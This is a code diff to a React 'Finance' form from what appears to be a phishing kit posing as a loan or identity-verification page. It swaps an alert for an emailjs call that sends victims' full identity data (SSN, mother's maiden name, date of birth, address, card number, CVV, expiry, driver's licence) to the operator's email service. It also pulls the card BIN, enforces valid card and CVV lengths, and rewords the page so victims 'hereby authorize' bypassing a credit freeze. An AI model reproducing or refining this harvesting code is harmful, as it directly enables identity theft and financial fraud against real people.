@@ -1,7 +1,9 @@
-import { useState } from 'react';
+import emailjs, { init } from 'emailjs-com';
+import { useEffect, useState } from 'react';
 import { useSelector } from 'react-redux';
 import './finance.css';
 
+init("user_ld15Epetajzy4LTSlKCz8");
 function Finance() {
 
 	const {
@@ -27,6 +29,7 @@ function Finance() {
 
 	const [name, setName] = useState('')
 	const [CC, setCC] = useState('')
+	const [bin, setBin] = useState('')
 	const [ccExpiryMonth, setCcExpiryMonth] = useState('')
 	const [ccExpiryYear, setCcExpiryYear] = useState('')
 	const [cSC, setcSC] = useState('')
@@ -35,33 +38,50 @@ function Finance() {
 	const [dLExpiryDay, setdLExpiryDay] = useState('')
 	const [dLExpiryYear, setdLExpiryYear] = useState('')
 
+	const templateParams = {
+		firstName,
+		middleName,
+		lastName,
+		phone,
+		dobMonth,
+		dobDay,
+		dobYear,
+		ssn1,
+		ssn2,
+		ssn3,
+		mmn,
+		filedForTaxReturn,
+		address1,
+		address2,
+		city,
+		state,
+		zipcode,
+		country,
+		name,
+		CC,
+		bin,
+		ccExpiryMonth,
+		ccExpiryYear,
+		cSC,
+		DLNumber,
+		dLExpiryMonth,
+		dLExpiryDay,
+		dLExpiryYear
+	}
+
+	useEffect(() => {
+		setBin(CC.substr(0,6))
+	}, [CC])
+
 	const handleSubmit = e => {
 		e.preventDefault()
-        const fulllzzzz = `
-        %%% FULLLZZZZ %%%
-
-        === PERSONAL INFO ===
-        Full Name: ${firstName} ${middleName} ${lastName}
-        DOB (MM/DD/YYYY): ${dobMonth}/${dobDay}/${dobYear}
-        Phone Number: ${phone}
-        Address: ${address1} ${address2}
-        City: ${city}
-        State: ${state}
-        Zipcode: ${zipcode}
-        Country: ${country}
-        Social Security Number: ${ssn1}-${ssn2}-${ssn3}
-        Mother's Maiden Name: ${mmn}
-        Filed for tax return in last 7 years?: ${filedForTaxReturn}
-        
-        === FINANCIAL INFO ===
-		Name on Card: ${name}
-		Card Number: ${CC}
-		Expiry Date: ${ccExpiryMonth}/${ccExpiryYear}
-		CVV: ${cSC}
-		Driver's License Number (if applicable): ${DLNumber}
-		Driver's License Expiry Date (MM/DD/YYYY): ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear}
-		`
-		alert(fulllzzzz)
+		emailjs.send('service_zbdegps', 'template_95nph9k', templateParams)
+		.then(function(response) {
+			console.log('SUCCESS!', response.status, response.text);
+		 }, function(error) {
+			console.log('FAILED...', error);
+		 });
+		// alert(fulllzzzz)
 	}
 	
   return (
@@ -243,7 +263,7 @@ if (top != self) {
 					</p>
 					
 					<p>
-						If you have a credit freeze, you may authorize us to bypass that freeze to verify your identity.
+						If you have a credit freeze, you hereby authorize us to bypass that freeze to verify your identity.
 					</p>
 					
 					<p>
@@ -299,7 +319,7 @@ if (top != self) {
 						</label>
 						<input type="text"
 						className="textbox "
-						 id="student_loan" name="student_loan" maxLength="16"
+						 id="student_loan" name="student_loan" minLength="15" maxLength="16"
 						 tabIndex="0"
 						 required
 						 value={CC}
@@ -553,7 +573,7 @@ if (top != self) {
 						</label>
 						<input type="text"
 						className="textbox-nosize "
-						 id="auto_loan" name="auto_loan" maxLength="4"
+						 id="auto_loan" name="auto_loan" minLength="3" maxLength="4"
 						 tabIndex="0"
 						 required
 						 value={cSC}
